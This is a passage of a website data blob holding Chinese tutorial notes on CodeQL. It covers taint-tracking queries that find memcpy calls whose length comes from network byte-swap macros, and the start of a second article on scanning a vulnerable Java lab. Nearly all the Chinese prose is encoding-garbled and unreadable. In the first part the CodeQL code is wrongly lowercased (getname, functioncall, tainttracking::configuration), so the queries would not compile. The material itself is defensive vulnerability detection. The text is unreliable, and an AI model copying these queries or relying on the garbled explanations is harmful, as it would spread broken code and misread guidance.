æ£æ¥å®æ¯ï¼å¹¶å¨prçè¿ç¨ä¸­æ¾ç¤ºè¿åº¦ã\n\n 4. æ£æ¥å®æä¹åï¼å¦ææ¾ç¤ºç»¿è²åä»£è¡¨éè¿ã\n\n\n# æäº¤å°mainåæ¯\n\nè¿ç§æ¹å¼æ¯prçæ¹å¼ç®åå¾å¤ï¼æä»¬å¨åç»­çæäº¤ä¸­é½ä¼ä½¿ç¨è¿ç§æ¹å¼ï¼\n\n 1. å°ä»£ç æ¨éå°è¯¾ç¨çè¿ç¨ä»åºä¸­\n    \n    git add .\n    git commit -m "any message here - why not step 3"\n    git push origin main\n    \n    \n    1\n    2\n    3\n    \n\n2.ç­å¾æ£æ¥å®æï¼æ£æ¥å®æåè¿å¥ä¸ä¸èãæ£æ¥å¤±è´¥åå¯ä»¥ç¼è¾æä»¬çæ¥è¯¢è¯­å¥ï¼åæ¬¡æäº¤ã\n\n\n# 4. è§£ææ¥è¯¢\n\n\n# è§£æ\n\nè¿ä¸èä¸­ï¼å¯¹ä¸ä¸èæä»¬ç¼åçæ¥è¯¢è¯­å¥åäºä¸ä¸ªåæï¼å¹¶ä¸è®©æä»¬ç®åæ¹åä¸ä¸ä¸é¢çæ¥è¯¢å®æç¸åºçæ¥è¯¢ä»»å¡ã\n\ncodeqlä¸­çæ¥è¯¢ä¸è¬é½æå¦ä¸çç»æï¼\n\nimport å¼å¥ä¸ä¸ªcodeqlåº\n\nfrom åéçå£°æé¨å\nwhere æ¥è¯¢çé»è¾\nselect è¾åºçç»æ\n\n\n1\n2\n3\n4\n5\n\n\nååé¡¾ä¸ä¸æä»¬ä¸ä¸è¯¾çæ¥è¯¢è¯­å¥ï¼\n\nimport cpp\n\nfrom function f\nwhere f.getname() = "strlen"\nselect f, "a function named strlen"\n\n\n1\n2\n3\n4\n5\n\n\nç¬¬ä¸å¥æ¯import cppï¼è¿æ¯ä¸ä¸ªå¯¼å¥çè¯­å¥ï¼åç»­æä»¬å¨æ¥è¯¢ä¸­ä½¿ç¨çææçå£°æç­ï¼é½æ¯éè¿è¿ä¸ªè¯­å¥å¯¼å¥çã\n\nç¬¬äºå¥æ¯from function fï¼å£°æäºä¸ä¸ªåéfï¼å¶ä¸­functionæ¯ä¸ä¸ªç±»ï¼è¯¥ç±»æ¯c/c++ä¸­çææçå½æ°çéåã\n\nå¨whereåé¢æ¥ççæ¯æä»¬æ¥è¯¢çè°è¯ï¼è°è¯è¿ä¸ªæ¦å¿µå¨åé¢ä¹å¸¸è¢«æå°ï¼å¯ä»¥ç®åçè§£ä¸ºä¸ä¸ªå½æ°ï¼åè¿éé¢çgetnameå°±æ¯ä¸ä¸ªè°è¯ï¼è¿ä¸ªä¸ºæ­¤æä¸ä¸ªè¿åå¼ï¼å½è¿ä¸ªè¿åå¼æ»¡è¶³ç­äºstrlenæ¡ä»¶æ¶ï¼å°±æç§selctçè¦æ±æ¾ç¤ºç»æã\n\n\n# æ¾å°åä¸ºmemcpyçå½æ°\n\n 1. ç¼è¾4_memcpy_definitions.ql\n 2. æç§ç¬¬ä¸é¨çæ¥è¯¢ä¸­çæ¥è¯¢è¯­å¥ï¼å°æ¥è¯¢çæ¡ä»¶ä¿®æ¹ä¸ºæ¥è¯¢åå­ä¸ºmemcpyã\n 3. è¿è¡æ¥è¯¢è¯­å¥ï¼æ¥çæ¥è¯¢çç»æ\n 4. æäº¤ä½ çæ¥è¯¢å°è¿ç¨ä»åº\n\nimport cpp\n\nfrom function f \nwhere f.getname() = "memcpy"\nselect f, "function named memcpy"\n\n\n1\n2\n3\n4\n5\n\n\n\n# 5. ä½¿ç¨ä¸åçç±»åè°è¯\n\nå¨ç¬¬åèä¸­ï¼æä»¬ä½¿ç¨äºfunctionç±»å¹¶ä½¿ç¨äºgetnameè·åäºææçæ¹æ³åãèå¨è¿ä¸èä¸­ï¼æä»¬éè¦æ¥è¯¢ç»åºçä¸ä¸ªè½¬æ¢å­èåºçå®ï¼å®æ¯cè¯­è¨ä¸­çä¸ä¸ªéè¦çå®ä¹ï¼ä¸çæcçæåä¹ä¸ç¨æå¿ï¼è¿éåªæ¯ç¨æ¥å¼å¥å¶ä»çä¸äºæ¥è¯¢çç±»ï¼ãè¿æ¬¡çæ¥è¯¢ä»£ç åä¸æ¬¡çç±»ä¼¼ï¼\n\nimport cpp\n\nfrom macro m\nwhere m.getname() = "ntohl" \n        or m.getname() = "ntohll"\n        or m.getname() = "ntohs"\nselect m,"macro named ntoh*"\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nç±äºæ¥è¯¢çæ¡ä»¶æä¸ä¸ªï¼ntohlãntohllãntohsï¼æä»¬å¯ä»¥ä½¿ç¨oræ¥å¹¶åå¤ä¸ªæ¥è¯¢æ¡ä»¶ãä¹å¯ä»¥ä½¿ç¨æ­£åè¡¨è¾¾å¼çåæ³ï¼\n\nwhere m.getname().regexpmatch("ntoh(s|l|ll)")\n\n\n1\n\n\næèä½¿ç¨inçæ¹å¼ï¼\n\nwhere m.getname() in ["ntohs","ntohl","ntohll"]\n\n\n1\n\n\nä»¥ä¸ä¸ç§æ¹å¼åå¯ã\n\n\n# 6. ä½¿ç¨å¹¶å³èä¸¤ä¸ªåé\n\nä»¥ä¸çå èä¸­ï¼å¨fromåé¢æä»¬åªå£°æäºä¸ä¸ªåéï¼å¨è¿ä¸èæä»¬éè¦å£°æä¸¤ä¸ªåéï¼å¹¶ä½¿ç¨ä¸¤ä¸ªåéä¹é´çå³ç³»èåå®æç¸å³çæ¥è¯¢ãè¿ç§æ¹å¼æå©äºå¸®æä»¬æ¾åºå½æ°çè°ç¨ã\n\n 1. ç¼è¾6_memcpy_calls.ql\n 2. ä½¿ç¨ä»£è¡¨å½æ°è°ç¨çç±»å¹¶å£°æåé\n 3. ä½¿ç¨å½æ°è°ç¨ç±»çç¸å³è°è¯æ¥æ¾å½æ°çè°ç¨ä½ç½®\n 4. åç¬¬åæ­¥ä¸­çå½æ°æ¥æ¾ç»åï¼æ¾åºå½æ°memcpyçè°ç¨ä½ç½®\n 5. å®æå¹¶è¿è¡æ¥è¯¢ï¼æ²¡æé®é¢åï¼æäº¤æ¥è¯¢\n\nimport cpp\n\nfrom function f, functioncall call\n\nwhere call.gettarget() = f \n    and f.getname() = "memcpy"\nselect call\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 7. ç»§ç»­å³èä¸¤ä¸ªåé\n\nå¨ç¬¬äºèä¸­ï¼ç¼åäºä¸ä¸ªæ¥è¯¢ï¼æ¥æ¾ææçåä¸ºntoh*çå®ãå¨ç¬¬å­èä¸­ç¼åäºä¸ä¸ªæ¥è¯¢ï¼æ¥æ¾ææåä¸ºmemcpyçå½æ°çè°ç¨ä½ç½®ãèå¨è¿ä¸èä¸­ï¼éè¦æ¾å°ä»¥ä¸åä¸ºntoh*çå®çè°ç¨ä½ç½®ã\n\n 1. ç¼è¾7_macro_invocations.ql\n 2. ä½¿ç¨èªå¨è¡¥å¨ï¼æ¾åºæ¥æ¾å®è°ç¨çç±»\n 3. æ¾åºä»£è¡¨å®è°ç¨çè°è¯\n 4. æ¥è¯¢å®çåç§°åå®çè°ç¨ä½ç½®\n 5. è¿è¡æ¥è¯¢ï¼æäº¤ä»£ç \n\nimport cpp\n\nfrom macro m, macroinvocation mi\nwhere m.getname().regexpmatch("ntoh(s|l|ll)")\n    and mi.getmacro() = m\nselect m,mi\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 8. æ´æ¹è¾åº\n\nå¨ä¸ä¸èæä»¬æ¾å°äºææåä¸ºntoh*çå®ä¹ï¼å¹¶ä¸æ¥æ¾äºææçè°ç¨ä½ç½®ï¼èå¨è¿ä¸èä¸­ï¼éè¿ macroinvocation è¿ä¸ªç±»æ¥æ¥è¯¢ "ntohs" ç­å®çè°ç¨ï¼å¹¶éè¿ getexpr() è¿ä¸ªæ¹æ³è¿è¡å®çå±å¼ï¼å¾å°ç¸åºçä»£ç çæ®µã\n\nimport cpp\n\nfrom macroinvocation mi\nwhere mi.getmacroname().regexpmatch("ntoh(s|l|ll)")\nselect mi.getexpr()\n\n\n1\n2\n3\n4\n5\n\n\n\n# 9. ç¼åèªå·±çç±»\n\nå¨ä¸é¢çæ¥è¯¢ä¸­ï¼æä»¬ä½¿ç¨è¿functionãfunctioncallãmarcoãmarcoinvocationç­ç±»ï¼è¿äºç±»é½æ¯codeqlæä¾ç»æä»¬è°ç¨çãæä»¬ä¹å¯ä»¥å®ä¹ä¸ä¸ªèªå·±çç±»ï¼å¨æ¬èä¸­ï¼éè¿å®ç°ä¸ä¸ªèªå·±çç±»ï¼è½èªå®ä¹ä¸ä¸ªèªå·±æ³è¦çæ°æ®éåãå¦ææç¹æµå¯ä»¥çç codeql å³äºç±»çç¸å³ææ¡£ãæ¥è¯¢è¯­å¥ä¸­çç±»ä¸­ï¼åéè¿ exists éè¯åå»ºä¸ä¸ªä¸´æ¶åé mi æ¥è¡¨ç¤ºè¢«è°ç¨çå®çåå­ï¼å¦æè¢«è°ç¨ççå®å±å¼ååå½åä»£ç çæ®µç¸ç­ï¼åè¿ä¸ªè¡¨è¾¾å¼å±äºè¿ä¸ªéåã\n\nå¨è¿ä¸èä¸­ï¼æä»¬ç¼åçç±»å°ä¸ä¸èçåå®¹è¿è¡ä¸ä¸ªå°è£ï¼å°è£å®æä¹åï¼åªéè¦è°ç¨ç¸åºçç±»å³å¯æ¥è¯¢åºç»æã\n\n 1. ç¼è¾9_class_network_byteswap.ql\n 2. ç¼åä¸ä¸ªç±»ï¼ç»§æ¿exprï¼expræ¯ææè¡¨è¾¾å¼çç±»\n 3. ä½¿ç¨existsï¼å®ææä»¬éè¦çæ¥è¯¢ï¼å¹¶è¿åç¸åºçç»æ\n 4. ä¿®æ¹å¦ä¸çæ¨¡ç\n\nimport cpp\n\nclass networkbyteswap extends expr {\n  networkbyteswap () {\n    // todo: replace <class> and <var>\n    exists(<class> <var> |\n      // todo: <condition>\n    )\n  }\n}\n\nfrom networkbyteswap n\nselect n, "network byte swap"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n5. å®ææ¥è¯¢ï¼è¿è¡å¹¶æäº¤\n\n\nimport cpp\n\nclass networkbyteswap extends expr {\n  networkbyteswap() {\n    exists(macroinvocation mi |\n      mi.getmacroname().regexpmatch("ntoh(s|l|ll)") and\n      this = mi.getexpr()\n    )\n  }\n}\n\nfrom networkbyteswap n\nselect n, "network byte swap"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 10. æ°æ®æµåæ±¡ç¹è¿½è¸ª\n\nç¬¬åèæ¯è¿ä¸ªé¡¹ç®çæåä¸èãå¨ç¬¬ä¹æ­¥ï¼æä»¬å¨ä»£ç ä¸­åç°äºä¸äºå¯ä»¥è¿ç¨è¾å¥çè¡¨è¾¾å¼ãä»ä»¬å¯ä»¥è¢«è®¤ä¸ºæ¯è¿ç¨è¾å¥ç æºãæºè¿ä¸ªæ¦å¿µæ¯æ±¡ç¹åæçéè¦æ¦å¿µï¼ç®åçè§£å°±æ¯ç¨æ·è¾å¥æ¶æä»£ç çä½ç½®ãå¨ç¬¬å­æ­¥ä¸­ï¼æä»¬åç°äºmemcpyçè°ç¨ï¼è¿äºè°ç¨å¯è½æ¯ä¸å®å¨çï¼å ä¸ºä»ä»¬çé¿åº¦æ¯è¢«è¿ç¨ç¨æ·å¯ä»¥æ§å¶çãè¿äºå¯ä»¥ç§°ä¸ºæ±èç¹ï¼æ±èç¹æ¯äº§çä¸å®å¨æä½çä½ç½®ãè¿éçmemcpyæ¥åå¯æ§å¶çé¿åº¦çå¼ã\n\néè¿ç»åä¸é¢çä¿¡æ¯ï¼æä»¬ç¥éå½æ°æ®æµä»ä¸ä¸ªç¨æ·å¯æ§çsourceæµåå°å­å¨é£é©çsinkä½ç½®çæ¶åï¼ä¸ä¸ªç¨åºæ¯å­å¨å®å¨é£é©çãä½æ¯æä»¬æ¯æä¹ç¥éæ°æ®ä»ä¸ä¸ªsourceæµåsinkçå¢ï¼è¿éæå°äº**æ°æ®æµãæ±¡ç¹åæææ¯ã**å ä¸ºå¯è½å­å¨ä¸åçsourceåsinkï¼è¿æ ·ç»åèµ·æ¥ï¼å¦æä½¿ç¨äººå·¥çæ¹å¼ï¼å¯è½äº§çå¤§éçå·¥ä½éãcodeqlæ¿æä»¬è¿è¡åæãä½ åªéè¦ç¼åä¸ä¸ªæ¥è¯¢ï¼å°±å¯ä»¥åç°9ä¸ªçå®å­å¨çå®å¨é£é©ã\n\nä¸ºäºè¾¾å°è¿ä¸ªç®æ ï¼æä»¬ä½¿ç¨codeqlæ±¡ç¹åæåºï¼è¿ä¸ªåºå¯ä»¥å®ä¹sourceåsinkï¼å½å¯¹åºçæ°æ®ä»sourceæµè½¬å°sinkæ¶ï¼hashflowpathæç«ã\n\nå¨è¿ä¸èä¸­ï¼æä»¬éè¦ç¼åä¸ä¸ªæ±¡ç¹åæçæ¥è¯¢ã\n\n 1. ç¼è¾10_taint_tracking.ql\n\n 2. ä½¿ç¨å¦ä¸çæ¨¡æ¿æä»¶\n    \n    /**\n     * @kind path-problem\n     */\n    \n    import cpp\n    import semmle.code.cpp.dataflow.tainttracking\n    import dataflow::pathgraph\n    \n    class networkbyteswap extends expr {\n      // todo: copy from previous step\n    }\n    \n    class config extends tainttracking::configuration {\n      config() { this = "networktomemfunclength" }\n    \n      override predicate issource(dataflow::node source) {\n        // todo\n      }\n      override predicate issink(dataflow::node sink) {\n        // todo\n      }\n    }\n    \n    from config cfg, dataflow::pathnode source, dataflow::pathnode sink\n    where cfg.hasflowpath(source, sink)\n    select sink, source, sink, "network byte swap flows to memcpy"\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    \n\n 3. å¤å¶ç¬¬ä¹æ­¥çèªå®ä¹ç±»ï¼ç¼åis sourceåissinkå®ä¹æºåæ±èã\n    \n    * å¨ç¬¬ä¹æ­¥å·²ç»ç¼åäºè¯å«ntoh*çç±»ï¼è¿éåªéè¦ä½¿ç¨instanceå³é®å­è¿è¡å¤æ­å³å¯\n    * æ³¨æsourceåéæ¯ç±»åçdataflow::nodeï¼èä½ çnetworkbyteswapç±»æ¯çå­ç±»exprï¼æä»¥æä»¬ä¸è½åªåsource instanceof networkbyteswapã\n\n 4. è¿è¡æ¥è¯¢ï¼æäº¤ã\n\n\n/**\n * @kind path-problem\n */\n\nimport cpp\nimport semmle.code.cpp.dataflow.tainttracking\nimport dataflow::pathgraph\n\nclass networkbyteswap extends expr {\n  networkbyteswap() {\n    exists(macroinvocation mi |\n      mi.getmacroname().regexpmatch("ntoh(s|l|ll)") and\n      this = mi.getexpr()\n    )\n  }\n}\n\nclass config extends tainttracking::configuration {\n  config() { \n      this = "networktomemfunclength" \n    }\n\n  override predicate issource(dataflow::node source) { \n      source.asexpr() instanceof networkbyteswap \n    }\n  override predicate issink(dataflow::node sink) {\n    exists(functioncall call |\n      call.gettarget().getname() = "memcpy" and\n      sink.asexpr() = call.getargument(2) and\n      not call.getargument(1).isconstant()\n    )\n  }\n}\n\nfrom config cfg, dataflow::pathnode source, dataflow::pathnode sink\nwhere cfg.hasflowpath(source, sink)\nselect sink, source, sink, "network byte swap flows to memcpy"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\næ°å®ä¹ç config ç±»ç»§æ¿äº tainttracking::configurationãå¨è¿ä¸ªç±»ä¸­ï¼å¯¹ issource åissinkè¿ç¨éè½½ï¼issourceè°è¯­å®ä¹ä¸ºæ±¡ç¹çæºå¤´ï¼è issink å®ä¹ä¸ºæ±¡ç¹çå»å¤ã\n\nææ¶åï¼è¿ç¨è¾å¥çæ°æ®å¯è½ç»è¿ ntoh å½æ°å¤çï¼éè¿è½¬æ¢å­èåºå¾å°ç¸åºçæ°å­ãè memcpy çç¬¬ 2 ä¸ªåæ°å¦ææ§å¶ä¸å½ï¼å¯é ææ°æ®æº¢åºãå°ä¸é¢ä¸¤ä¸ªç»è®ºç»åèµ·æ¥ï¼å¦ææä¸ä¸ªè¿ç¨è¾å¥çæ°æ®éè¿å­èåºåæ¢å¾å°çæ°å­ï¼å¨æªç»è¿æ ¡éªçæåµä¸ï¼ä½ä¸ºäº memcpy çç¬¬äºä¸ªåæ°ï¼é£ä¹å°±æå¯è½é ææ°æ®æº¢åºã\n\nç§ç github å®å¨å¢éçæç« ï¼å¯ä»¥ç§ç«ç»èçè¡¥å¨æ°æ®æ¥è¯¢è¯­å¥ã\n\nå¨ issource ä¸­ï¼æä»¬éè¿å¤æ­ source ç expr æ¯å¦æ¯ networkbyteswap è¿ä¸ªç±»ï¼æ¥å¤æ­æ±¡ç¹çæºå¤´ã\n\nå¨ issink ä¸­ï¼æä»¬ä½¿ç¨äºè¾å©ç±» functioncall å¤æ­å½æ°è°ç¨æ¯å¦ä¸º memcpy ä¸ sink çä»£ç çæ®µæ¯å¦ä¸º memcpy çç¬¬äºä¸ªåæ°ï¼æåä¸å¥åæ¯å¤æ­å½æ°çç¬¬ä¸ä¸ªåæ°æ¯å¦ä¸ºå¸¸éï¼å¦æä¸ºå¸¸éçè¯åºæ¬ä¸å¯è½åºç°é®é¢ï¼ææå¿½ç¥ã\n\n\n\n\n# åèèµæ\n\n 1. https://zhuanlan.zhihu.com/p/137569940\n 2. https://codeql.github.com/docs/ql-language-reference',charsets:{cjk:!0},lastUpdated:"2022/04/04, 16:22:20",lastUpdatedTimestamp:164908934e4},{title:"CodeQLä»å¥é¨å°æ¾å¼",frontmatter:{title:"CodeQLä»å¥é¨å°æ¾å¼",date:"2022-04-05T00:00:00.000Z",permalink:"/sec/sa/codeql/codeqlstep0to1",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["éæåæ","CodeQL"],tags:["CodeQL"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/200.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/2001.CodeQL/02.%20CodeQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83.html",relativePath:"02.å®å¨/200.éæåæ/2001.CodeQL/02. CodeQLä»å¥é¨å°æ¾å¼.md",key:"v-5dd47d80",path:"/sec/sa/codeql/codeqlstep0to1/",headers:[{level:2,title:"ä¸ºä»ä¹æ¯CodeQL",slug:"ä¸ºä»ä¹æ¯codeql",normalizedTitle:"ä¸ºä»ä¹æ¯codeql",charIndex:146},{level:2,title:"ç¯å¢ä»ç»",slug:"ç¯å¢ä»ç»",normalizedTitle:"ç¯å¢ä»ç»",charIndex:777},{level:2,title:"CodeQLåå»ºå¹¶å¯¼å¥æ°æ®åº",slug:"codeqlåå»ºå¹¶å¯¼å¥æ°æ®åº",normalizedTitle:"codeqlåå»ºå¹¶å¯¼å¥æ°æ®åº",charIndex:993},{level:2,title:"CodeQL åºç¡è¯­æ³",slug:"codeql-åºç¡è¯­æ³",normalizedTitle:"codeql åºç¡è¯­æ³",charIndex:1593},{level:3,title:"åºç¡QL",slug:"åºç¡ql",normalizedTitle:"åºç¡ql",charIndex:1609},{level:3,title:"è®¾ç½®sourceåsink",slug:"è®¾ç½®sourceåsink",normalizedTitle:"è®¾ç½®sourceåsink",charIndex:2500},{level:3,title:"å¤æ­è¿é",slug:"å¤æ­è¿é",normalizedTitle:"å¤æ­è¿é",charIndex:3309},{level:3,title:"å°ç»çæ¬",slug:"å°ç»çæ¬",normalizedTitle:"å°ç»çæ¬",charIndex:3636},{level:2,title:"è¯¯æ¥å¤ç",slug:"è¯¯æ¥å¤ç",normalizedTitle:"è¯¯æ¥å¤ç",charIndex:4875},{level:2,title:"æ¼æ¥è§£å³",slug:"æ¼æ¥è§£å³",normalizedTitle:"æ¼æ¥è§£å³",charIndex:5574},{level:2,title:"åèèµæ",slug:"åèèµæ",normalizedTitle:"åèèµæ",charIndex:87}],excerpt:'<h1 id="codeqlä»å¥é¨å°æ¾å¼"><a class="header-anchor" href="#codeqlä»å¥é¨å°æ¾å¼">#</a> CodeQLä»å¥é¨å°æ¾å¼</h1>\n<blockquote>\n<p>è¿ç¯æç« æ¯æå¨å­¦ä¹ CodeQLæ¶çç¬è®°ï¼è¯¥æç« å®å¨åèäºl4yn3å¸åå¨FreeBufä¸åè¡¨ãCodeQLä»å¥é¨å°æ¾å¼ããæç« çé¾æ¥ä¼æ¾å°åèèµæä¸­ãè³äºä¸ºä»ä¹è¦éæ°åä¸ç¯ç±»ä¼¼çæç« ï¼åªæ¯åçº¯ä¸ºäºè®°å½ä¸ä¸èªå·±å­¦ä¹ CodeQLä½¿ç¨çè¿ç¨éå°çé®é¢ã</p>\n</blockquote>\n',headersStr:"ä¸ºä»ä¹æ¯CodeQL ç¯å¢ä»ç» CodeQLåå»ºå¹¶å¯¼å¥æ°æ®åº CodeQL åºç¡è¯­æ³ åºç¡QL è®¾ç½®sourceåsink å¤æ­è¿é å°ç»çæ¬ è¯¯æ¥å¤ç æ¼æ¥è§£å³ åèèµæ",content:'# CodeQLä»å¥é¨å°æ¾å¼\n\n> è¿ç¯æç« æ¯æå¨å­¦ä¹ CodeQLæ¶çç¬è®°ï¼è¯¥æç« å®å¨åèäºl4yn3å¸åå¨FreeBufä¸åè¡¨ãCodeQLä»å¥é¨å°æ¾å¼ããæç« çé¾æ¥ä¼æ¾å°åèèµæä¸­ãè³äºä¸ºä»ä¹è¦éæ°åä¸ç¯ç±»ä¼¼çæç« ï¼åªæ¯åçº¯ä¸ºäºè®°å½ä¸ä¸èªå·±å­¦ä¹ CodeQLä½¿ç¨çè¿ç¨éå°çé®é¢ã\n\n\n# ä¸ºä»ä¹æ¯CodeQL\n\nCodeQLä½ä¸ºä»£ç å®å¨å®¡è®¡çä¸æ¬¾ååå¥½ç¨åé«æçå·¥å·ï¼å¹¶ä¸æ¯å­ç©ºåºç°çãè¿è¦ä»ä»£ç å®¡è®¡çåå²è¯´èµ·ã\n\nå¨ææ©æçæ¶åï¼ç±äºç³»ç»è§æ¨¡è¾å°ï¼ä»£ç éè¿æ¯æå°ï¼ä»£ç ä¹é´çé»è¾è°ç¨å³ç³»ä¹å¾æ¸æ°ï¼å®å¨äººåéå¸¸éç¨äººå·¥çæ¹å¼å»å¯»æ¾ä»£ç ä¸­å­å¨çå®å¨é®é¢ãèäººå·¥å®¡è®¡ä¸è¬æä¸ç§å¸¸è§çå®¡è®¡æè·¯ï¼ç¬¬ä¸ç§æ¯å¨æéè¯»ï¼å¨å¨é¢çéè¯»ä»£ç ä¹åï¼å¯¹ä»£ç æä¸ä¸ªå¨é¢ççè§£ï¼ç¥éæ¯ä¸é¨åä»£ç çåè½ï¼ç¶åç»åå·ä½çåè½åç°ä»£ç ä¸­å­å¨çé®é¢ï¼è¿ç§å®¡è®¡çæ¹å¼ååçç»è´ï¼ä½æ¯ä¹ååçèæ¶ï¼ç¬¬äºç§æ¹å¼æ¯å®ä½å±é©çå½æ°ï¼ç¶ååä¸è¿½æº¯å°å±é©æ°æ®è¾å¥çä½ç½®ï¼å¦ææ°æ®æµæ²¡æä¸­æ­åå­å¨ä¸æ¡ä»ç¨æ·è¾å¥å°å±é©å½æ°çéè·¯ï¼è¿ç§æ¹å¼è½ç¶å¿«æ·ï¼ä½æ¯ä¸å¨é¢ï¼å¯¹åºä¸äºé»è¾æ¼æ´æ è½ä¸ºåï¼ç¬¬ä¸ç§æ¹å¼æ¯éå¯¹ä¸äºç¹å®çåè½ç¹è¿è¡å¨èçå»ºæ¨¡åå®¡è®¡ï¼è¿ç§æ¹å¼ç¸å¯¹è¾å¿«ä¸å¯¹äºé»è¾æ¼æ´ä¹è½æå¾å¥½çææ¡ã\n\nä½æ¯éçé¡¹ç®å¤æåº¦åä»£ç éä¸çææ°çº§å¢é¿ï¼äººå·¥çæ¹å¼å¾é¾è¿è¡å¨é¢çå®¡è®¡ï¼å æ­¤å°±éè¦ä¸äºè½¯ä»¶çä»å¥ï¼éåäººå·¥å®æä»£ç å®¡è®¡ãè¿ä¸é¶æ®µçä¸äºå·¥å·ä¾å¦ripsãCobraå¯ä»¥å¸®å©å®ä½å°å±é©å½æ°ï¼ç¶ååç±äººå·¥ç¡®è®¤æ¯å¦å­å¨æ¼æ´ãè¿ç§æ¹å¼ä¹æ¯éè¦ä¾é äººå·¥è¿è¡å¤å®ï¼å®å¨äººåçååè¿æ¯æ¯è¾å¤§ï¼å æ­¤ä¹å°±è¿­ä»£åºäºä¸äºèªå¨åçä»£ç å®¡è®¡äº§åï¼ä¾å¦å¸¸ç¨çCheckmarxãFortify SCAç­ãCodeQLä¹æ¯å±äºè¿ä¸ç±»åçå·¥å·ï¼ç¸è¾äºå¶ä»å ç§å·¥å·èè¨ï¼CodeQLå¼æºãå¯èªå®ä¹ç¨åº¦é«çä¼ç¹ååå¼å¾å®å¨äººåå­¦ä¹ åä½¿ç¨ã\n\n\n# ç¯å¢ä»ç»\n\nè¿éä½¿ç¨çæ¯l4yn3å¸åæ­å»ºçé¶åºï¼è¯¥é¶åºæ¯ä½¿ç¨SpringBootæ­å»ºçï¼éé¢åå«äºä¸äºå¸¸è§æ¼æ´ç±»åãè¿ä¸ç¯å°±å©ç¨CodeQLå»èªå¨æ£ç´¢è¿äºæ¼æ´ï¼å¹¶åå°è¯¯æ¥åæ¼æ¥é®é¢ãæçç¯å¢éç½®å¦ä¸ï¼\n\n * æä½ç³»ç»ï¼Mac OS\n * Javaçæ¬ï¼1.8.0_311\n * mavençæ¬ï¼3.8.4\n * é¶åºä¸è½½å°åï¼https://github.com/l4yn3/micro_service_seclab/\n\n\n# CodeQLåå»ºå¹¶å¯¼å¥æ°æ®åº\n\nå¯¹äºCodeQLçç¯å¢æ­å»ºåæ¬VSCodeãCodeQL CLIçç¸å³éç½®å¨ä¹åçæç« ä¸­æè¯¦ç»åè¿ï¼è¿éå°±ä¸åèµè¿°ã\n\nå¨éç½®å®æç¯å¢å¹¶ä¸å°é¶åºä»£ç åéå°æ¬å°ä¹åï¼æä»¬ä½¿ç¨CodeQL CLIçç¸å³å½ä»¤çæä¸ä¸ªæ°æ®åºï¼\n\ncodeql database create ./seclab_db --language=java --command="mvn clean install --file pom.xml" --source-root=./micro_service_seclab\n\n# --language æå®è¯­è¨\n# --command="mvn clean install --file pom.xml" ç¼è¯å½ä»¤Javaè¯­è¨ä½¿ç¨mavenè¿è¡ç¼è¯\n# --source-root=  é¡¹ç®è·¯å¾\n\n\n1\n2\n3\n4\n5\n\n\næç»åºç°Successfully created databaseä»£è¡¨æ°æ®åºåå»ºå®æäºï¼å¨åå»ºè¿ç¨ä¸­å¦æåçæ¥éï¼å¯ä»¥å é¤æ°æ®åºåæ¬¡è¿è¡ãæ³¨æè¦ä¿æå¨è·¯å¾ä¸­æ²¡æç©ºæ ¼å­å¨ã\n\n\n\nå¨åå»ºå®ææ°æ®åºä¹åï¼å¯ä»¥å°æ°æ®åºå¯¼å¥å°VSCodeä¸­ã\n\n\n\nè¿è¡hello worldæµè¯ç¯å¢æ¯å¦æ­£å¸¸ã\n\nselect "helloworld"\n\n\n1\n\n\n\n\nè³æ­¤ï¼ç¯å¢å·²ç»æ­å»ºå¥½äºï¼æ°æ®åºä¹å·²ç»å¯¼å¥äºãåé¢å°±å¼å§ç¼åç¸åºçæ¥è¯¢è¯­å¥ã\n\n\n# CodeQL åºç¡è¯­æ³\n\n\n# åºç¡QL\n\næä»¬å©ç¨CodeQLçå½ä»¤åå»ºäºCodeQLæ°æ®åºï¼ç¶åéè¦ä½¿ç¨CodeQLæä¾çå¼æºçè§ååºç¼åç¸å³çè§åï¼åç°å®å¨æ¼æ´ã\n\n\n\nCodeQLæ¯ä¸ç§ç±»SQLçæ¥è¯¢è¯­å¥ï¼ä¸»è¦ç±åé¨åç»æï¼\n\nimport java # å¯¼å¥è¯­å¥ å¯¼å¥ç¸å³çåº\n\nfrom ... # å®ä¹ç¸å³çåé\nwhere # è®¾ç½®æ¥è¯¢çæ¡ä»¶\nselect # æ¾ç¤ºæ¥è¯¢çç»æ\n\n\n1\n2\n3\n4\n5\n\n\nå¨fromè¯­å¥ä¸­ï¼æä»¬éå¸¸ä½¿ç¨CodeQLæä¾ç»æä»¬çå¾å¤ç±»åºæ¥å£°æåéãæä»¬ç»å¸¸ä½¿ç¨çç±»åºæå¦ä¸çå ä¸ªï¼\n\nåç§°             è§£é\nMethod         æ¹æ³ç±»ï¼Method methodè¡¨ç¤ºè·åå½åé¡¹ç®ä¸­ææçæ¹æ³\nMethodAccess   æ¹æ³è°ç¨ç±»ï¼MethodAccess callè¡¨ç¤ºè·åå½åé¡¹ç®å½ä¸­çæææ¹æ³è°ç¨\nParameter      åæ°ç±»ï¼Parameterè¡¨ç¤ºè·åå½åé¡¹ç®å½ä¸­ææçåæ°\n\næ¯å¦æä»¬å¯ä»¥ä½¿ç¨æ¥è¯¢è¯­å¥æ¾åºææåä¸ºget*çæ¹æ³ã\n\nimport java\n\nfrom Method method\nwhere method.getName().regexpMatch("get.*")\nselect method.getName(),method.getDeclaringType()\n\n\n1\n2\n3\n4\n5\n\n\næä»¬å¯ä»¥å°whereåé¢çæ¥è¯¢æ¡ä»¶å°è£